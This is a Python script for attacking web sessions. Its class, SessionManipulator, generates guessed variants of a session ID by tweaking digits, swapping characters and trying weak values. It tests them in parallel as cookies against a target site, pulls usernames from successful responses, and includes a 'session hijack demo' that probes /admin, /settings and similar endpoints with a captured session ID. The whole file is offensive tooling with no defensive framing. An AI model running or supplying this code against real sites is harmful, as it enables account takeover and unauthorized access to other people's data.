#!/usr/bin/env python3

import requests
import hashlib
import itertools
import string
import time
from concurrent.futures import ThreadPoolExecutor
import json

class SessionManipulator:
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url
        self.proxy = proxy
        self.session = requests.Session()
        if proxy:
            self.session.proxies.update(proxy)
    
    def generate_session_variants(self, original_session, max_variants=1000):
        """Generate potential session ID variants"""
        variants = set()
        
        # Original session
        variants.add(original_session)
        
        # Increment/decrement if numeric parts exist
        for i, char in enumerate(original_session):
            if char.isdigit():
                # Increment
                new_char = str((int(char) + 1) % 10)
                variant = original_session[:i] + new_char + original_session[i+1:]
                variants.add(variant)
                
                # Decrement
                new_char = str((int(char) - 1) % 10)
                variant = original_session[:i] + new_char + original_session[i+1:]
                variants.add(variant)
        
        # Character substitution
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
        for i in range(min(len(original_session), 10)):  # Limit to avoid too many variants
            for char in charset[:10]:  # Limit character set
                if len(variants) >= max_variants:
                    break
                variant = original_session[:i] + char + original_session[i+1:]
                variants.add(variant)
        
        # Common weak session patterns
        weak_patterns = [
            'admin', 'test', 'user', 'guest', 'demo',
            '123456', 'password', 'session', 'cookie',
            '000000', '111111', 'aaaaaa', 'abcdef'
        ]
        
        for pattern in weak_patterns:
            variants.add(pattern)
            # Pad to original length if needed
            if len(pattern) < len(original_session):
                padded = pattern + '0' * (len(original_session) - len(pattern))
                variants.add(padded)
        
        return list(variants)[:max_variants]
    
    def test_session_access(self, session_id, endpoint='/profile'):
        """Test session access to specific endpoint"""
        try:
            test_session = requests.Session()
            if self.proxy:
                test_session.proxies.update(self.proxy)
            
            # Set the session cookie
            test_session.cookies.set('sessionid', session_id)
            
            # Test access
            response = test_session.get(self.base_url + endpoint, timeout=5)
            
            # Analyze response
            result = {
                'session_id': session_id,
                'status_code': response.status_code,
                'valid': False,
                'user_info': None,
                'response_length': len(response.text)
            }
            
            # Check for successful access indicators
            if response.status_code == 200:
                # Look for user-specific content
                if any(keyword in response.text.lower() for keyword in ['welcome', 'profile', 'dashboard', 'user']):
                    result['valid'] = True
                    
                    # Try to extract user information
                    import re
                    user_match = re.search(r'welcome[,\s]+([a-zA-Z0-9_]+)', response.text, re.IGNORECASE)
                    if user_match:
                        result['user_info'] = user_match.group(1)
            
            return result
            
        except Exception as e:
            return {
                'session_id': session_id,
                'status_code': 0,
                'valid': False,
                'error': str(e),
                'response_length': 0
            }
    
    def parallel_session_test(self, session_variants, max_workers=10):
        """Test multiple sessions in parallel"""
        print(f"Testing {len(session_variants)} session variants...")
        
        valid_sessions = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_session = {
                executor.submit(self.test_session_access, session_id): session_id 
                for session_id in session_variants
            }
            
            # Process results
            for future in future_to_session:
                result = future.result()
                if result['valid']:
                    valid_sessions.append(result)
                    print(f"Valid session found: {result['session_id']}")
                    if result['user_info']:
                        print(f"  -> User: {result['user_info']}")
        
        return valid_sessions
    
    def session_hijack_demo(self, target_session_id):
        """Demonstrate session hijacking"""
        print(f"Attempting to hijack session: {target_session_id}")
        
        # Test original session
        result = self.test_session_access(target_session_id)
        
        if result['valid']:
            print("Session hijacking successful!")
            print(f"Status Code: {result['status_code']}")
            print(f"Response Length: {result['response_length']}")
            if result['user_info']:
                print(f"Compromised User: {result['user_info']}")
            
            # Try to access sensitive endpoints
            sensitive_endpoints = ['/profile', '/settings', '/admin', '/dashboard']
            
            for endpoint in sensitive_endpoints:
                endpoint_result = self.test_session_access(target_session_id, endpoint)
                if endpoint_result['valid']:
                    print(f"Access granted to: {endpoint}")
                else:
                    print(f"Access denied to: {endpoint}")
        else:
            print("Session hijacking failed - invalid session ID")
    
    def save_results(self, results, filename='session_results.json'):
        """Save results to file"""
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"Results saved to {filename}")

